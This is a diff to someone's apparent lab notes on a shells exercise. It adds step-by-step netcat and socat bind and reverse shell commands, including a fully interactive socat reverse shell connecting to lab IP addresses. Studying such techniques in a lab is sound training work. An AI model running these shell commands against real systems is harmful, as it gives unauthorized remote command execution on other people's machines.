@@ -697,17 +697,44 @@ The remainder of this task will consist of shell examples for you to try out on 
 
 	* Bind shell
 
-		`mkfifo /tmp/f; nc -lvnp 8888 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+		* Step 1 on target machine = `mkfifo /tmp/f; nc -lvnp 8888 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+		* step 2 on our machine = `nc 10.10.227.114 8888`
 
 		![task13-common-bindshell](./images/task13-common-bindshell.png)
 
-	* Revese shell
+	* Reverse shell
 
-		`mkfifo /tmp/f; nc 10.13.52.88 9999 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+		* Step 1 on our machine = `nc -lvnp 9999`
+		* Step 2 on target machine = `mkfifo /tmp/f; nc 10.13.52.88 9999 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
 
 		![task13-common-reverse](./images/task13-common-reverse.png)
 
 * Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.
+
+	#### Socat normal techniques
+
+	* Bind shell
+
+		* Step 1 on target machine = `socat TCP-L:8888 EXEC:"bash -li"`
+		* Step 2 on our machine = `socat TCP:10.10.227.114:8888 -`
+		
+		![task13-socat-normal-bind](./images/task13-socat-normal-bind.png)
+
+	* Reverse shell
+
+		* Step 1 on our machine = `socat TCP-L:9999 -`		
+		* Step 2 on target machine = `socat TCP:10.13.52.88:9999 EXEC:"bash -li"`
+
+		![task13-socat-normal-reverse](./images/task13-socat-normal-reverse.png)
+
+	#### Socat special techniques
+
+	Reverse shell when target system is Linux
+
+	* Step 1 on our machine = ``socat TCP-L:9999 FILE:`tty`,raw,echo=0``
+	* Step 2 on target machine = `socat TCP:10.13.52.88:9999 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
+
+	![task13-socat-special](./images/task13-socat-special.png)
 
 * Look through [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and try some of the other reverse shell techniques. Try to analyse them and see why they work.
 
